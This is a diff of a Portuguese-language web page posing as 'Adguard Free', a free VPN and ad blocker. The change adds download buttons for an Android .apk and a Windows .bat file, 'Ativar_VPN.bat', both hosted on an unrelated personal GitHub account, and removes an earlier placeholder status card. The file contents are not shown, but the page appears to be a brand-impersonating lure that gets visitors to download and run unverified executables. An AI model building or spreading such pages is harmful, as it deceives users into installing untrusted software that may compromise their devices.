@@ -5,22 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adguard Free Version</title>
     <style>
-        body { font-family: sans-serif; background: #000; color: #fff; text-align: center; margin: 0; padding: 20px; }
-        .logo { width: 100px; margin-top: 30px; }
-        .card { background: #111; border: 1px solid #4caf50; border-radius: 20px; padding: 20px; margin-top: 20px; }
-        .btn { background: #4caf50; color: #fff; padding: 15px; border-radius: 10px; text-decoration: none; display: block; margin-top: 20px; font-weight: bold; }
-        .status { color: #4caf50; font-size: 0.9em; margin-bottom: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: white; text-align: center; padding: 20px; }
+        .container { background: #111; border: 2px solid #4caf50; border-radius: 25px; padding: 30px; max-width: 400px; margin: auto; box-shadow: 0 0 30px rgba(76, 175, 80, 0.2); }
+        .logo { width: 90px; filter: drop-shadow(0 0 10px #4caf50); }
+        
+        .download-btn { background: #4caf50; color: white; text-decoration: none; padding: 18px; display: block; border-radius: 12px; font-weight: bold; margin: 15px 0; transition: 0.3s; border: none; font-size: 16px; cursor: pointer; }
+        .download-btn:hover { background: #45a049; transform: scale(1.02); }
+        .win-btn { background: #0078d4; }
+        
+        .status-box { background: #1a1a1a; padding: 15px; border-radius: 15px; margin-top: 20px; border: 1px solid #333; }
+        .status-on { color: #4caf50; font-weight: bold; }
     </style>
 </head>
 <body>
-    <img src="https://cdn-icons-png.flaticon.com/512/6711/6711467.png" class="logo">
-    <h1>Adguard <span style="color:#4caf50">Free</span></h1>
-    <div class="card">
-        <div class="status">● SERVIDOR VPN ONLINE</div>
-        <p>IP: <b>SEU_IP_AQUI</b></p>
-        <p>Protocolo: <b>IKEv2 / IPsec</b></p>
-        <p>Anúncios Bloqueados: <b>Ativado</b></p>
+
+    <div class="container">
+        <img src="https://cdn-icons-png.flaticon.com/512/6711/6711467.png" class="logo">
+        <h1>Adguard <span style="color:#4caf50">Free</span></h1>
+        <p style="color: #888;">Navegação Privada & Bloqueio de Anúncios</p>
+
+        <div class="status-box">
+            Status do Servidor: <span class="status-on">● ONLINE</span>
+        </div>
+
+        <a href="https://github.com/eduardomedeiros85981519-crypto/adguard-free.github.io/raw/main/adguard-free.apk" class="download-btn">
+            📥 BAIXAR VPN PARA ANDROID (.APK)
+        </a>
+
+        <a href="https://github.com/eduardomedeiros85981519-crypto/adguard-free.github.io/raw/main/Ativar_VPN.bat" class="download-btn win-btn">
+            💻 BAIXAR PARA WINDOWS (.BAT)
+        </a>
+
+        <p style="font-size: 0.7em; color: #555; margin-top: 20px;">Segurança nativa via IKEv2/IPSec</p>
     </div>
-    <a href="#" class="btn" onclick="alert('Vá em Configurações > VPN e use os dados acima!')">COMO CONECTAR</a>
+
 </body>
 </html>
